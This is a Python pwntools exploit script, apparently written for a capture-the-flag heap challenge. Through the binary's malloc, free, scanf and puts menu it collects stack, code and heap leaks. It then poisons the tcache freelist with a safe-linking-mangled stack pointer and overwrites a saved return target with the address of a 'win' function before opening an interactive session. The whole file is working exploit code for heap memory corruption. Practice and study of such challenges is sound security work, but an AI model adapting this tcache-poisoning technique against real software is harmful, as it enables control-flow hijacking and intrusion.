#!/bin/python

from pwn import * 
import sys

context.arch = 'amd64'

FIRST_BIN_OFFSET = 0x2c0
BUFFER_OFF = 0x118

def get_leak():
    proc.recvuntil(b"[LEAK]")
    proc.recvuntil(b": ")
    return int(proc.recvline(drop=True)[:-1], 16)


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def tcache_get_two_entries(bin):
    malloc(14, bin)
    malloc(15, bin)
    free(15)
    free(14)


def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


size = 16 * 5
if (len(sys.argv) == 2):
    proc = process(sys.argv[1])
else: 
    proc = gdb.debug(sys.argv[1], '''
                     pwndbg-init
                     ''')

stack_leak = get_leak() 
main_addr  = get_leak() 
goal_addr  = (main_addr & 0xFFFFFFFFF000) + (proc.elf.symbols['win'] & 0x0FFF)

malloc(0, size)
free(0)
heap_leak = get_addr_num(puts(0))
print("[$] heap leak:  " + hex(heap_leak))
print("[$] stack leak: " + hex(stack_leak))

tcache_get_two_entries(16 * 5)
scanf(14, p64((stack_leak ^ heap_leak) ))
malloc(15, size)
malloc(15, size)

scanf(15, p64(stack_leak + BUFFER_OFF))
scanf(0, p64(goal_addr))

proc.interactive()
